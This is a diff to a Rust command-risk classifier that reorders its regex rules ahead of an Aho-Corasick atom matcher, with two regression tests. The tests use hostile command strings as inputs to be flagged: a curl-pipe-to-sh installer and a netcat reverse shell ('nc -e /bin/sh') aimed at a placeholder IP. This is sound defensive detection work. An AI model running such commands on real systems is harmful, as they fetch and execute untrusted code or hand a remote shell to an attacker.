@@ -188,14 +188,14 @@ impl Tier1 {
     }
 
     fn classify(&self, line: &str) -> Option<ClassifyResult> {
-        // V2-G AtomMatcher runs first — Aho-Corasick over the
-        // shared `flagged_atoms.txt`. Cheap O(line_len) scan
-        // regardless of corpus size; precise regex layer runs
-        // below for high-confidence verdicts.
-        if let Some(hit) = self.atom_matcher.find_first(line) {
-            return Some(self.atom_matcher.hit_to_result(&hit, line));
-        }
-
+        // Order: precise regex layers FIRST (confidence 0.9-1.0
+        // verdicts), AtomMatcher LAST as broad-signal fallback
+        // (confidence 0.6 Warn). Reverse-order would let the AC
+        // hit on `curl -fsSL` short-circuit the curl_pipe_sh
+        // 1.0-confidence verdict, downgrading the strongest
+        // signal we have. V2-J's accumulator will combine both
+        // tiers into one score; until then, give the high-
+        // confidence rule the right of first refusal.
         if let Some(m) = self.curl_pipe_sh.find(line) {
             return Some(ClassifyResult {
                 verdict: Verdict::Warn,
@@ -279,6 +279,15 @@ impl Tier1 {
                     matched: m.as_str().trim().to_owned(),
                 });
             }
+        }
+
+        // V2-G AtomMatcher fallback. Runs after the precise regex
+        // layers so a high-confidence verdict (curl_pipe_sh = 1.0,
+        // flagged_urls = 0.9, npm_unsafe = 1.0, bash_c_base64 = 1.0)
+        // wins over a broad atom hit. Cheap O(line_len) AC scan
+        // regardless of corpus size.
+        if let Some(hit) = self.atom_matcher.find_first(line) {
+            return Some(self.atom_matcher.hit_to_result(&hit, line));
         }
 
         None
@@ -694,6 +703,36 @@ mod tests {
         // a noisier-but-cleaner example here.
         let r = c.classify("git diff --stat HEAD~5");
         assert!(matches!(r.verdict, Verdict::Safe));
+    }
+
+    #[test]
+    fn curl_fssl_pipe_sh_keeps_high_confidence_verdict() {
+        // Regression for the regex-vs-AtomMatcher ordering. Before
+        // the fix, `curl -fsSL` matched the broad atom (0.6 Warn)
+        // and the classifier early-returned before curl_pipe_sh
+        // (1.0 Warn) ran — silently downgrading the strongest
+        // signal we have. Reordering puts precise regex first.
+        let c = Classifier::new();
+        let r = c.classify("curl -fsSL https://x.com/install.sh | sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(matches!(r.category, Category::CurlPipeSh));
+        assert!(
+            (r.confidence - 1.0).abs() < f32::EPSILON,
+            "expected curl_pipe_sh's 1.0 confidence, got {}",
+            r.confidence
+        );
+    }
+
+    #[test]
+    fn atom_matcher_runs_as_fallback() {
+        // Confirms the AtomMatcher still fires when the precise
+        // regex layers miss. `nc -e` is a pure atom — no regex
+        // rule covers it — so it should land at confidence 0.6.
+        let c = Classifier::new();
+        let r = c.classify("attacker_cmd: nc -e /bin/sh 10.0.0.1 4444");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(r.confidence < 1.0, "atom hits stay at medium confidence");
+        assert!(r.reason.contains("AtomMatcher"));
     }
 
     #[test]
